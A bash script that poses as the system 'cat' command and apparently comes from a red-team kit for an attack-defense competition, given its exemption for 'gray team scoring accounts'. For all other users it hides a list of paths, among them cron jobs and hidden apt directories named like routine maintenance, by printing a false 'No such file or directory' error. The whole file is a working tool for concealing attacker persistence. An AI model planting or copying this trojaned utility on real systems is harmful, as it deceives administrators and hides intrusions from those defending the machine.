#!/bin/bash
REAL_CAT="/bin/cat"

# Pass straight through for gray team scoring accounts
case "$(whoami)" in
    kingneptune|paintythepirate|greyteamadmin) exec $REAL_CAT "$@" ;;
esac



PROTECTED=(
    "/usr/local/bin"
    "/var/lib/apt/lists/.cache"
    "/usr/lib/x86_64-linux-gnu/apt/methods/.d"
    "/usr/local/sbin/apt-daily-check"
    "/etc/cron.d/apt-daily-check"
    "/etc/cron.d/sudo-cache-clear"
)

_is_protected() {
    local target
    target=$(readlink -f "$1" 2>/dev/null || echo "$1")
    for p in "${PROTECTED[@]}"; do
        [[ "$target" == "$p" || "$target" == "$p/"* ]] && return 0
    done
    return 1
}

FLAGS=()
SAFE_ARGS=()
HAS_FILE_ARGS=0
RC=0

for arg in "$@"; do
    case "$arg" in
        -*) FLAGS+=("$arg") ;;
        *)
            HAS_FILE_ARGS=1
            if _is_protected "$arg"; then
                echo "cat: ${arg}: No such file or directory" >&2
                RC=1
            else
                SAFE_ARGS+=("$arg")
            fi
            ;;
    esac
done

if [ ${#SAFE_ARGS[@]} -gt 0 ]; then
    $REAL_CAT "${FLAGS[@]}" "${SAFE_ARGS[@]}" || RC=$?
elif [ "$HAS_FILE_ARGS" -eq 0 ]; then
    # No file args at all — pass through stdin (handles: bare `cat`, `cat -n`, heredocs, pipes)
    $REAL_CAT "${FLAGS[@]}" || RC=$?
fi
# If all file args were protected, we already printed errors — just exit
exit $RC
